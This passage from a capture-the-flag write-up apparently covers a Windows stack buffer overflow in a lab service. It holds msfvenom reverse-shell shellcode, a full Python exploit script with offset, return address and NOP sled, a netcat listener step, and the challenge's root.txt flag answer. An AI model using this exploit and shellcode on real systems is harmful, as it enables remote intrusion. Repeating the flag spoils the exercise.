"\xb1\x52\x83\xc2\x04\x31\x5a\x0e\x03\x8b\xae\xec\x8c\xd7"
"\x47\x72\x6e\x27\x98\x13\xe6\xc2\xa9\x13\x9c\x87\x9a\xa3"
"\xd6\xc5\x16\x4f\xba\xfd\xad\x3d\x13\xf2\x06\x8b\x45\x3d"
"\x96\xa0\xb6\x5c\x14\xbb\xea\xbe\x25\x74\xff\xbf\x62\x69"
"\xf2\xed\x3b\xe5\xa1\x01\x4f\xb3\x79\xaa\x03\x55\xfa\x4f"
"\xd3\x54\x2b\xde\x6f\x0f\xeb\xe1\xbc\x3b\xa2\xf9\xa1\x06"
"\x7c\x72\x11\xfc\x7f\x52\x6b\xfd\x2c\x9b\x43\x0c\x2c\xdc"
"\x64\xef\x5b\x14\x97\x92\x5b\xe3\xe5\x48\xe9\xf7\x4e\x1a"
"\x49\xd3\x6f\xcf\x0c\x90\x7c\xa4\x5b\xfe\x60\x3b\x8f\x75"
"\x9c\xb0\x2e\x59\x14\x82\x14\x7d\x7c\x50\x34\x24\xd8\x37"
"\x49\x36\x83\xe8\xef\x3d\x2e\xfc\x9d\x1c\x27\x31\xac\x9e"
"\xb7\x5d\xa7\xed\x85\xc2\x13\x79\xa6\x8b\xbd\x7e\xc9\xa1"
"\x7a\x10\x34\x4a\x7b\x39\xf3\x1e\x2b\x51\xd2\x1e\xa0\xa1"
"\xdb\xca\x67\xf1\x73\xa5\xc7\xa1\x33\x15\xa0\xab\xbb\x4a"
"\xd0\xd4\x11\xe3\x7b\x2f\xf2\x06\x6e\x28\xdc\x7f\x8c\x36"
"\xf1\x23\x19\xd0\x9b\xcb\x4f\x4b\x34\x75\xca\x07\xa5\x7a"
"\xc0\x62\xe5\xf1\xe7\x93\xa8\xf1\x82\x87\x5d\xf2\xd8\xf5"
"\xc8\x0d\xf7\x91\x97\x9c\x9c\x61\xd1\xbc\x0a\x36\xb6\x73"
"\x43\xd2\x2a\x2d\xfd\xc0\xb6\xab\xc6\x40\x6d\x08\xc8\x49"
"\xe0\x34\xee\x59\x3c\xb4\xaa\x0d\x90\xe3\x64\xfb\x56\x5a"
"\xc7\x55\x01\x31\x81\x31\xd4\x79\x12\x47\xd9\x57\xe4\xa7"
"\x68\x0e\xb1\xd8\x45\xc6\x35\xa1\xbb\x76\xb9\x78\x78\x86"
"\xf0\x20\x29\x0f\x5d\xb1\x6b\x52\x5e\x6c\xaf\x6b\xdd\x84"
"\x50\x88\xfd\xed\x55\xd4\xb9\x1e\x24\x45\x2c\x20\x9b\x66"
"\x65";
```

Since msfvenom creates an encoded shellcode there consists a decoder element that is first executed beforehand. Simply adding what we call a NOP sledge informed of the shellcode `\x90`.

Final script:
```python
#!/usr/bin/env python3

import socket, sys

ip = "10.10.15.134" #"10.211.55.3"
port = 9999
username = b'username'
payload_length = 3000
offset = 2012
payload = b'A' * offset + b'\xdf\x14\x50\x62' + b'\x90' * 32

payload += b"\xbb\xd1\xa0\x0e\x79\xdb\xcc\xd9\x74\x24\xf4\x5a\x29\xc9"
payload += b"\xb1\x52\x83\xc2\x04\x31\x5a\x0e\x03\x8b\xae\xec\x8c\xd7"
payload += b"\x47\x72\x6e\x27\x98\x13\xe6\xc2\xa9\x13\x9c\x87\x9a\xa3"
payload += b"\xd6\xc5\x16\x4f\xba\xfd\xad\x3d\x13\xf2\x06\x8b\x45\x3d"
payload += b"\x96\xa0\xb6\x5c\x14\xbb\xea\xbe\x25\x74\xff\xbf\x62\x69"
payload += b"\xf2\xed\x3b\xe5\xa1\x01\x4f\xb3\x79\xaa\x03\x55\xfa\x4f"
payload += b"\xd3\x54\x2b\xde\x6f\x0f\xeb\xe1\xbc\x3b\xa2\xf9\xa1\x06"
payload += b"\x7c\x72\x11\xfc\x7f\x52\x6b\xfd\x2c\x9b\x43\x0c\x2c\xdc"
payload += b"\x64\xef\x5b\x14\x97\x92\x5b\xe3\xe5\x48\xe9\xf7\x4e\x1a"
payload += b"\x49\xd3\x6f\xcf\x0c\x90\x7c\xa4\x5b\xfe\x60\x3b\x8f\x75"
payload += b"\x9c\xb0\x2e\x59\x14\x82\x14\x7d\x7c\x50\x34\x24\xd8\x37"
payload += b"\x49\x36\x83\xe8\xef\x3d\x2e\xfc\x9d\x1c\x27\x31\xac\x9e"
payload += b"\xb7\x5d\xa7\xed\x85\xc2\x13\x79\xa6\x8b\xbd\x7e\xc9\xa1"
payload += b"\x7a\x10\x34\x4a\x7b\x39\xf3\x1e\x2b\x51\xd2\x1e\xa0\xa1"
payload += b"\xdb\xca\x67\xf1\x73\xa5\xc7\xa1\x33\x15\xa0\xab\xbb\x4a"
payload += b"\xd0\xd4\x11\xe3\x7b\x2f\xf2\x06\x6e\x28\xdc\x7f\x8c\x36"
payload += b"\xf1\x23\x19\xd0\x9b\xcb\x4f\x4b\x34\x75\xca\x07\xa5\x7a"
payload += b"\xc0\x62\xe5\xf1\xe7\x93\xa8\xf1\x82\x87\x5d\xf2\xd8\xf5"
payload += b"\xc8\x0d\xf7\x91\x97\x9c\x9c\x61\xd1\xbc\x0a\x36\xb6\x73"
payload += b"\x43\xd2\x2a\x2d\xfd\xc0\xb6\xab\xc6\x40\x6d\x08\xc8\x49"
payload += b"\xe0\x34\xee\x59\x3c\xb4\xaa\x0d\x90\xe3\x64\xfb\x56\x5a"
payload += b"\xc7\x55\x01\x31\x81\x31\xd4\x79\x12\x47\xd9\x57\xe4\xa7"
payload += b"\x68\x0e\xb1\xd8\x45\xc6\x35\xa1\xbb\x76\xb9\x78\x78\x86"
payload += b"\xf0\x20\x29\x0f\x5d\xb1\x6b\x52\x5e\x6c\xaf\x6b\xdd\x84"
payload += b"\x50\x88\xfd\xed\x55\xd4\xb9\x1e\x24\x45\x2c\x20\x9b\x66"
payload += b"\x65"

try:
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((ip, port))
  print("Connected")
except Exception as e:
  print("Error while connecting")
  print(e)
  sys.exit(1)

try:
  s.recv(1024)
  s.recv(1024)

  print("Sending username")
  s.send(username + b'\r\n')

  s.recv(1024)

  print("Sending payload")
  s.send(payload + b'\r\n')
  s.recv(1024)
except Exception as e:
  print("Error while sending data")
  print(e)
  sys.exit(1)

finally:
  print("Closing socket")
  s.close()
```

Staart a netcat listener on port 4444 and run the script.

```
C:\Users\drake\Desktop>type root.txt
type root.txt
5b1001de5a44eca47eee71e7942a8f8a
```

> After gaining access, what is the content of the root.txt file? `5b1001de5a44eca47eee71e7942a8f8a`